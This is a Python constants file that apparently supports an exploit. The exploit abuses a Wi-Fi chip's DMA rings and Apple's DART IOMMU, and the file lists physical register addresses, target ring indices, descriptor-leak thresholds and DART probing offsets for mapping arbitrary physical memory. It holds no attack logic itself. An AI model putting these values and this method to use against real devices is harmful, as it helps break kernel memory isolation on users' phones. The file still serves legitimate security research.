#The size, in bytes, of a DWORD
DWORD_SIZE = 4

#The size, in bytes, of a QWORD
QWORD_SIZE = 8

#The physical address of DART's registers
#Corresponds to "dart-apcie2" according to the device tree
DART_REGISTERS_PA = 0x603008000

#The physical address of SoC hardware registers
PE_SOC_BASE_PHYS = 0x200000000

#The offset of the RORGN_BEGIN register within the SoC register range
RORGN_BEGIN_OFFSET = 0x7E4

#The physical base address of the DRAM
G_PHYS_BASE = 0x800000000

#The ring we're targetting for the overwrite
TARGET_RING_IDX = 3

#The minimal Flow ID (inclusive)
MIN_FLOW = 3

#The maximal Flow ID (inclusive)
MAX_FLOW = 6

#The size of each flow ring item
FLOW_RING_ITEM_SIZE = 48

#The target IO-Space address up to which we need to leak descriptors so
#as to trigger the allocation of a new DART L2 descriptor
LOW_THRESHOLD_IOSPACE_ADDR = 0x80600000

#The maximal IO-Space address reachable by the new DART L2 descriptor
HIGH_THRESHOLD_IOSPACE_ADDR = 0x80800000

#The last IO-Space probe address used to determine the DART offset
LAST_IOSPACE_PROBE_ADDR = (0x80600000 + 0x8000 * 2)

#A junk DWORD used to gage when H2D transactions complete
JUNK_VALUE = 0xABCDABCD

#The start address of the firmware's RAM
FW_RAM_START = 0x160000

#The end address of the firmware's RAM
FW_RAM_END = 0x240000

#The minimal IO-Space address used when mapping arbitrary PAs into DART
MIN_IOSPACE_MAPPING_ADDR = 0x80700000

#The maximal IO-Space address used when mapping arbitrary PAs into DART
MAX_IOSPACE_MAPPING_ADDR = 0x807FA000

#The threshold up to which fast leak mode is engaged
MAX_FAST_LEAK_THRESHOLD = 0x8000*4

#The minimal DART offset probed
MIN_DART_OFFSET = 0x8000

#The maximal DART offset probed
MAX_DART_OFFSET = 0x48000

#The skip distance between attempted DART offsets
DART_SKIP = 0x8000

#The offset of the first DART L0 descriptor in the DART hardware registers
DART_L0_DESC_OFFSET = 64

#The granularity of a DART mapping
DART_GRANULARITY = 0x1000

#The value stored in the first register in DART's hardware regs
#This is used to identify when we've successfully mapped DART into IO-Space
#(thus allowing us to figure out that the correct DART offset has been found)
DART_REG0_VALUE = 0x102
